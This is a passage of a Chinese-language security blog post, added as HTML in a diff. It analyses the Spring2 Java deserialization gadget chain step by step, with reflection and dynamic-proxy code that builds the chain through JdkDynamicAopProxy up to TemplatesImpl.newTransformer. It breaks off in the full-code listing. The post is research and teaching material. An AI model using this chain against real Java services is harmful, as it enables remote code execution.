@@ -1,0 +1,701 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="依赖版本  spring-core : 4.1.4.RELEASEspring-aop : 4.1.4.RELEASEjdk 1.7-1.8 Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="spring2-gadget">
+<meta property="og:url" content="https://unam4.github.io/2023/12/14/spring2-gadget/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="依赖版本  spring-core : 4.1.4.RELEASEspring-aop : 4.1.4.RELEASEjdk 1.7-1.8 Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e-20231214002318581.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9-20231214002318564.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278-20231214002318579.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67-20231214002318577.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234-20231214002318610.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93-20231214002318593.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793454923-2ba3c595-5dc3-4fc5-a779-bd46206ed72f.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793507324-0e71e207-3f9b-4e7e-9e30-79c75a34baa0.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793156483-92278a73-dacb-4767-a7e5-429b61b83be9.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793221615-9a34765e-5e44-4207-bbbe-f0acf846a5d5.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793246108-24036ed5-15ba-487b-a9b7-f6fd50e12827.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793361423-7f344a50-8377-43fb-9b20-e9446532f1e7.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701793751706-5ffc8718-c809-4a5e-865c-87b0d632643a.png">
+<meta property="og:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1701795213210-9ace4276-f84e-42c5-8c80-a4912c68cbad.png">
+<meta property="article:published_time" content="2023-12-13T16:22:52.000Z">
+<meta property="article:modified_time" content="2023-12-13T16:23:23.406Z">
+<meta property="article:author" content="unam4">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2023/12/14/spring2-gadget/1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png">
+  
+  
+  
+  <title>spring2-gadget - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="spring2-gadget"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-14 00:22" pubdate>
+          2023年12月14日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          631 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">spring2-gadget</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <ol>
+<li>依赖版本</li>
+</ol>
+<p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7-1.8</p>
+<p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p>
+<h2 id="0x01-MethodInvokeTypeProvider"><a href="#0x01-MethodInvokeTypeProvider" class="headerlink" title="0x01 MethodInvokeTypeProvider"></a>0x01 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p>
+<p>接下来我们从反序列触发点开始分析。</p>
+<p>readObject()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>	inputStream.defaultReadObject();<br>	<span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br>	<span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p>
+<h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p>
+<p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p>
+<p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e-20231214002318581.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9-20231214002318564.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278-20231214002318579.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-TypeProvider"><a href="#0x03-TypeProvider" class="headerlink" title="0x03 TypeProvider"></a>0x03 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p>
+<p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67-20231214002318577.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p>
+<p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p>
+<p>对应的实现代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>调试</p>
+<p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234-20231214002318610.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以发现成功返回了TemplatesImpl。</p>
+<p>但是为什么没有加载成功defindclass了。</p>
+<p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93-20231214002318593.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>这里报错需要一个Type，但是TemplatesImpl cannot be cast to java.lang.reflect.Type，我们需要返回type对象，然后这个继续通过动态代理type对象然后返回TemplatesImpl对象。 这样需要一个InvocationHandler接口的实现类，它的invoke需要满足返回需要去触发另一个动态代理去返回TemplatesImpl对象，然后它需要继承Serializable，最好是jdk原生类，或者Spring里面的类。前辈找到了JdkDynamicAopProxy可以满足这个要求。</strong></p>
+<h2 id="0x04-JdkDynamicAopProxy，AdvisedSupport"><a href="#0x04-JdkDynamicAopProxy，AdvisedSupport" class="headerlink" title="0x04 JdkDynamicAopProxy，AdvisedSupport"></a>0x04 JdkDynamicAopProxy，AdvisedSupport</h2><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java</strong></p>
+<p><img src="1701793454923-2ba3c595-5dc3-4fc5-a779-bd46206ed72f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java#setTarget（）</p>
+<p><img src="1701793507324-0e71e207-3f9b-4e7e-9e30-79c75a34baa0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>也就是通过setTarget对EMPTY_TARGET_SOURCE赋值，从而对targetSource赋值，</p>
+<p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;JdkDynamicAopProxy.java#invoke()</strong></p>
+<p><img src="1701793156483-92278a73-dacb-4767-a7e5-429b61b83be9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>获取 AdvisedSupport 里的 TargetSource，并调用 getTarget() 方法返回其中的对象</p>
+<p><img src="1701793221615-9a34765e-5e44-4207-bbbe-f0acf846a5d5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1701793246108-24036ed5-15ba-487b-a9b7-f6fd50e12827.png" srcset="/img/loading.gif" lazyload alt="img">调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回。</p>
+<p>方法里就是简单的反射调用。</p>
+<p><img src="1701793361423-7f344a50-8377-43fb-9b20-e9446532f1e7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在看JdkDynamicAopProxy构造函数。</p>
+<p><img src="1701793751706-5ffc8718-c809-4a5e-865c-87b0d632643a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>一切都很巧妙。</p>
+<p><strong>总结起来就是先初始化AdvisedSupport，然后把template对象setTarget进去，然后JdkDynamicAopProxy构造函数赋值advised为AdvisedSupport。这样动态代理JdkDynamicAopProxy时，就能触发targetSource.getTarget()，得到template对象。</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">      Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>      <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>      advisedSupport.setTarget(templates);<br>      Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>      Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br>      <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>      <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法        </span><br><span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>              Templates.class&#125;, AopInvocationHandler);<br><br>      HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>      Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>      <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>      Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>      Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="1701795213210-9ace4276-f84e-42c5-8c80-a4912c68cbad.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>运行没有问题。</p>
+<p>由于需要反序列化触发。</p>
+<p>所以MethodInvokeTypeProvider初始化时Method随便传一个，然后通过反射修改回newTransfrom。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-完整利用链"><a href="#0x05-完整利用链" class="headerlink" title="0x05 完整利用链"></a>0x05 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>	    AnnotationInvocationHandler.invoke()<br>		    ReflectionUtils.invokeMethod()<br>			    Templates(Proxy).newTransformer()<br>				    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>						    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure>
+
+<p>完整代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 